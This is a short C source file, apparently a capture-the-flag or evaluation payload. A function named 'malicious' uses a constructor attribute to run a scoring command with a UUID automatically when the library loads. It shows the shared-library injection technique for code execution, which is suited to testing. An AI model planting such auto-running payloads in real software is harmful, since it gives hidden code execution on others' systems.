#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score af101330-f850-4b88-a8c2-b78225b0093f");
}

